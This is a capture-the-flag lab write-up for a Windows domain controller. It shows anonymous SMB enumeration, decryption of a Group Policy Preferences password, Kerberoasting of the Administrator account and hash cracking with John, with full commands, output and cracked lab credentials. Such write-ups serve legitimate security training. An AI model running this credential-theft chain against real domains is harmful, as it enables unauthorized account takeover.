

## Enumeration
Document all enumeration don on the host to find vulnerable and attack paths

```r
nmap -Pn -sV -sC -p- --min-rate=200 10.129.7.12 -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-26 20:03 -0500
Nmap scan report for 10.129.7.12
Host is up (0.036s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-27 01:03:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-02-27T01:04:40
|_  start_date: 2026-02-27T00:56:41
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
|_clock-skew: -8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.19 seconds
```

### SMB Shares

```r
nxc smb 10.129.7.12
SMB         10.129.7.12     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)

nxc smb 10.129.7.12 -u '' -p '' --shares
SMB         10.129.7.12     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.12     445    DC               [+] active.htb\:
SMB         10.129.7.12     445    DC               [*] Enumerated shares
SMB         10.129.7.12     445    DC               Share           Permissions     Remark
SMB         10.129.7.12     445    DC               -----           -----------     ------
SMB         10.129.7.12     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.12     445    DC               C$                              Default share
SMB         10.129.7.12     445    DC               IPC$                            Remote IPC
SMB         10.129.7.12     445    DC               NETLOGON                        Logon server share
SMB         10.129.7.12     445    DC               Replication     READ
SMB         10.129.7.12     445    DC               SYSVOL                          Logon server share
SMB         10.129.7.12     445    DC               Users
```


I will use spidering in Netexec to dump everything in the Replication share

```r
nxc smb 10.129.7.12 -u '' -p '' -M spider_plus
SMB         10.129.7.12     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.12     445    DC               [+] active.htb\:
SPIDER_PLUS 10.129.7.12     445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.7.12     445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.7.12     445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.7.12     445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.7.12     445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.7.12     445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.7.12     445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.7.12     445    DC               [*] Enumerated shares
SMB         10.129.7.12     445    DC               Share           Permissions     Remark
SMB         10.129.7.12     445    DC               -----           -----------     ------
SMB         10.129.7.12     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.12     445    DC               C$                              Default share
SMB         10.129.7.12     445    DC               IPC$                            Remote IPC
SMB         10.129.7.12     445    DC               NETLOGON                        Logon server share
SMB         10.129.7.12     445    DC               Replication     READ
SMB         10.129.7.12     445    DC               SYSVOL                          Logon server share
SMB         10.129.7.12     445    DC               Users
SPIDER_PLUS 10.129.7.12     445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.7.12.json".
SPIDER_PLUS 10.129.7.12     445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.7.12     445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.7.12     445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.7.12     445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.7.12     445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.7.12     445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.7.12     445    DC               [*] File size max:        3.63 KB
```

Found this file Groups.xml after an extensive search in all the files and folders

Download the Group.xml file

```r
smbclient //10.129.7.12/Replication
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

		5217023 blocks of size 4096. 284643 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>
```

Looking into the group.xml file I see a username and an encrypted password


`username`: `active.htb\SVC_TGS` `password`: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`


Using `gpp-decrypt` I can decrypt the hash, since this is a `Group Policy Password encryption`

```r
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Found `loot`:


|__**username**__|__**password**__|
|--|--|
|SVC_TGS|GPPstillStandingStrong2k18|

```r
nxc smb 10.129.7.12 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M spider_plus
SMB         10.129.7.12     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.12     445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SPIDER_PLUS 10.129.7.12     445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.7.12     445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.7.12     445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.7.12     445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.7.12     445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.7.12     445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.7.12     445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.7.12     445    DC               [*] Enumerated shares
SMB         10.129.7.12     445    DC               Share           Permissions     Remark
SMB         10.129.7.12     445    DC               -----           -----------     ------
SMB         10.129.7.12     445    DC               ADMIN$                          Remote Admin
SMB         10.129.7.12     445    DC               C$                              Default share
SMB         10.129.7.12     445    DC               IPC$                            Remote IPC
SMB         10.129.7.12     445    DC               NETLOGON        READ            Logon server share
SMB         10.129.7.12     445    DC               Replication     READ
SMB         10.129.7.12     445    DC               SYSVOL          READ            Logon server share
SMB         10.129.7.12     445    DC               Users           READ
SPIDER_PLUS 10.129.7.12     445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.7.12.json".
SPIDER_PLUS 10.129.7.12     445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.7.12     445    DC               [*] SMB Readable Shares:  4 (NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.7.12     445    DC               [*] Total folders found:  50
SPIDER_PLUS 10.129.7.12     445    DC               [*] Total files found:    15
SPIDER_PLUS 10.129.7.12     445    DC               [*] File size average:    1.13 KB
SPIDER_PLUS 10.129.7.12     445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.7.12     445    DC               [*] File size max:        4.16 KB

```

Nothing found on the Users shares

## Foothold

Knowing more than one way to log into SMB helped me get the user flag

```r
smbclient //10.129.7.12/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 279002 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

		5217023 blocks of size 4096. 279002 blocks available
smb: \SVC_TGS\> cd Desktop\
smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Thu Feb 26 19:57:41 2026

		5217023 blocks of size 4096. 279002 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
​
## Privilege Escalation
Document how you were able to more laterally and gain a higher privilege

### Kerberoasting
I was able to do a kerberoasting and get the tgt ticket for Administrator’s account

```r
nxc ldap 10.129.7.12 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoasting output.txt
LDAP        10.129.7.12     389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.7.12     389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
LDAP        10.129.7.12     389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.7.12     389    DC               [*] Total of records returned 1
LDAP        10.129.7.12     389    DC               [*] sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon: 2026-02-26 19:57:46.095752
LDAP        10.129.7.12     389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$f63a5e02a5fe949c679e5ac758486e24$fac01a63d55220f139c3ba5619e27714a4f3e7de5f16f2f23fd2a256e431007ea380e88d492684311bc6d0f0212e95a530566a372a5cde55de85ec8959f6aa5a05f6f0d5ff5e62e4cccd4df3408d72b8bb3dcbc34bb6939d584fa7f3e243803af44a37e37455ebb7985ac4c1d426...................
```

---



### Cracking Admin TGT

With `John the ripper` I was able to crack the `admin’s TGT` and get it’s password

```r
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt admin.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:07 DONE (2026-02-26 22:20) 0.1251g/s 1318Kp/s 1318Kc/s 1318KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Admin flag

```c
smbclient //10.129.7.12/Users -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 279002 blocks available
smb: \> cd Administrator
		5217023 blocks of size 4096. 279002 blocks available
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> dir
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Thu Feb 26 19:57:42 2026

		5217023 blocks of size 4096. 279002 blocks available
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \Administrator\Desktop\> exit
```